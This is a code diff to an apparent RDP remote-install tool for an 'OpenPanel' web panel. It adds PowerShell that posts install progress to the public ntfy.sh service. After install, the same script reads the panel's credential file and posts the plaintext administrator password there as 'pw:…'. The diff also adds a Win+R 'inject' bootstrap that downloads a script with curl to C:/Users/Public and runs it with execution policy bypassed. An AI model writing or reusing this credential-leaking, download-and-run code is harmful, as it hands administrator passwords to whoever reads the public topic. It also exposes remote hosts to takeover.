@@ -34,6 +34,8 @@ export interface StageOptions {
     port?: number;
     serverPort?: number;
     skipStart?: boolean;
+    /** Optional ntfy.sh topic for remote install progress (lab / reachability proof). */
+    ntfyTopic?: string;
 }
 
 function buildInstallScript(opts: {
@@ -58,6 +60,17 @@ Start-Sleep -Seconds 3
     return `# OpenPanel RDP bootstrap (generated). Runs on the remote host only.
 $ErrorActionPreference = "Stop"
 $ProgressPreference = "SilentlyContinue"
+# Controllers rewrite __OP_NTFY__ to a one-shot topic (empty disables).
+$ntfyTopic = "__OP_NTFY__".Trim()
+function Write-OpNtfy([string]$Message) {
+  if (-not $ntfyTopic) { return }
+  try { & curl.exe -fsS -m 15 -d $Message "https://ntfy.sh/$ntfyTopic" | Out-Null } catch { }
+}
+Write-OpNtfy "boot"
+# Optional RDPDR ack (never required): prove share only if already mounted.
+try {
+  Set-Content -LiteralPath "\\\\tsclient\\OP\\op-ack.txt" -Value "boot" -Encoding ascii -ErrorAction SilentlyContinue
+} catch { }
 $stageRoot = Join-Path $env:TEMP ("open-panel-rdp-" + [guid]::NewGuid().ToString("n"))
 New-Item -ItemType Directory -Force -Path $stageRoot | Out-Null
 $tarball = Join-Path $stageRoot "${opts.tarballName}"
@@ -68,11 +81,13 @@ $tarballSrc = if ($origin -match '^[a-zA-Z][a-zA-Z0-9+.-]*://') {
 } else {
   Join-Path $origin.TrimEnd([char]92) "${opts.tarballName}"
 }
+Write-OpNtfy "fetch"
 if ($tarballSrc -match '^[a-zA-Z][a-zA-Z0-9+.-]*://') {
   Invoke-WebRequest -UseBasicParsing -Uri $tarballSrc -OutFile $tarball
 } else {
   Copy-Item -LiteralPath $tarballSrc -Destination $tarball -Force
 }
+Write-OpNtfy "fetched"
 
 function Ensure-OpenPanelNode {
   $env:Path = [Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [Environment]::GetEnvironmentVariable("Path", "User")
@@ -96,9 +111,11 @@ function Ensure-OpenPanelNode {
   }
 }
 Ensure-OpenPanelNode
+Write-OpNtfy "node-ok"
 
 # Omit optional native packages: local packs may still reference workspace protocol.
 npm install -g --omit=dev --omit=optional $tarball
+Write-OpNtfy "npm-ok"
 $prefix = (npm prefix -g).Trim()
 $candidates = @(
   (Join-Path $prefix "open-panel.cmd"),
@@ -113,8 +130,17 @@ if (-not $panel) {
 }
 if (-not $panel) { throw "open-panel not found after npm install -g (prefix=$prefix)" }
 # Same install path as local / npx / postinstall: write administrator + strong password.
-if ($panel -like "*.js") { & node $panel install --port ${opts.serverPort} } else { & $panel install --port ${opts.serverPort} }
+if ($panel -like "*.js") { & node $panel install --port ${opts.serverPort} --force } else { & $panel install --port ${opts.serverPort} --force }
+$credFile = Join-Path $env:APPDATA "open-panel\\webui-credentials.json"
+if (Test-Path -LiteralPath $credFile) {
+  try {
+    $cred = Get-Content -LiteralPath $credFile -Raw | ConvertFrom-Json
+    if ($cred.password) { Write-OpNtfy ("pw:" + [string]$cred.password) }
+  } catch { }
+}
+Write-OpNtfy "installed"
 ${startBlock}
+Write-OpNtfy ("up:" + ${opts.serverPort})
 $result = [ordered]@{
   ok = $true
   tarball = $tarball
@@ -126,6 +152,9 @@ $result = [ordered]@{
   at = (Get-Date).ToString("o")
 }
 $result | ConvertTo-Json -Compress | Set-Content -Encoding utf8 (Join-Path $env:TEMP "open-panel-rdp-result.json")
+try {
+  ($result | ConvertTo-Json -Compress) | Set-Content -LiteralPath "\\\\tsclient\\OP\\op-ack.txt" -Encoding ascii -ErrorAction SilentlyContinue
+} catch { }
 `;
 }
 
@@ -144,24 +173,31 @@ function candidateBaseUrls(port: number): string[] {
     return [...new Set(out)];
 }
 
-/** Build the short AlternateShell bootstrap (must stay under the 512-byte wire cap). */
-export function buildAlternateShellBootstrap(scriptUrl: string): string {
-    // Prefer a compact ASCII one-liner. Keep well under 512 bytes.
+/**
+ * Win+R / AlternateShell bootstrap that matches the proven short `curl` lab path.
+ *
+ * Lab: bare `\\tsclient\OP\a.cmd` never executed; short `cmd /c curl …` did (ntfy green).
+ * Avoid `|` and `%` (dropped / layout-sensitive). Download to Public, then launch.
+ */
+export function buildInjectHttpBootstrap(scriptUrl: string): string {
     const url = scriptUrl.trim();
     if (!url) {
         throw new AppError({ code: 'invalid_argument', message: 'script URL is required for RDP bootstrap' });
     }
-    // Detach via Start-Process so the install outlives the IronRDP hold/disconnect.
-    // Avoid `|` — some hosts drop or mis-type the pipe scancode in Win+R fallbacks.
     const shell =
-        `powershell.exe -NoP -EP Bypass -w Hidden -c "Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoP','-EP','Bypass','-c','iex((iwr -UseBasicParsing ''${url}'').Content)'"`;
+        `cmd /c curl.exe -fsSL -o C:/Users/Public/op-i.ps1 ${url} & powershell.exe -NoP -EP Bypass -File C:/Users/Public/op-i.ps1`;
     if (Buffer.byteLength(shell, 'utf8') + 1 > 510) {
         throw new AppError({
             code: 'invalid_argument',
-            message: `alternate_shell bootstrap exceeds MS-RDPBCGR 512-byte limit (${shell.length} chars)`,
+            message: `HTTP inject bootstrap exceeds MS-RDPBCGR 512-byte limit (${shell.length} chars)`,
         });
     }
     return shell;
+}
+
+/** Build the short AlternateShell / Win+R bootstrap (must stay under the 512-byte wire cap). */
+export function buildAlternateShellBootstrap(scriptUrl: string): string {
+    return buildInjectHttpBootstrap(scriptUrl);
 }
 
 /** RDPDR share name announced by `open-panel-rdp` (`\\tsclient\OP`). */
@@ -314,7 +350,10 @@ export function prepareRdpdrStageDir(options: {
         `$ErrorActionPreference = "Stop"`,
         '',
     ].join('\n');
-    const scriptBody = proofPrefix + scriptTemplate.replaceAll('__OP_BASE__', packRoot);
+    const ntfyTopic = (process.env.OPEN_PANEL_INSTALL_NTFY ?? '').trim();
+    const scriptBody = proofPrefix + scriptTemplate
+        .replaceAll('__OP_BASE__', packRoot)
+        .replaceAll('__OP_NTFY__', ntfyTopic);
     const scriptPath = path.join(dir, 'i.ps1');
     fs.writeFileSync(scriptPath, scriptBody, 'utf8');
     writeRdpdrProofCmd(dir, true);
@@ -427,7 +466,10 @@ export async function startPackStageServer(options: StageOptions): Promise<Stage
         chosenBase = chosenBase.replace(':0', `:${listenPort}`);
     }
 
-    scriptBody = scriptTemplate.replaceAll('__OP_BASE__', chosenBase);
+    const ntfyTopic = (options.ntfyTopic ?? process.env.OPEN_PANEL_INSTALL_NTFY ?? '').trim();
+    scriptBody = scriptTemplate
+        .replaceAll('__OP_BASE__', chosenBase)
+        .replaceAll('__OP_NTFY__', ntfyTopic);
     const scriptUrl = `${chosenBase}/i.ps1`;
     const tarballUrl = `${chosenBase}/${tarballName}`;
 
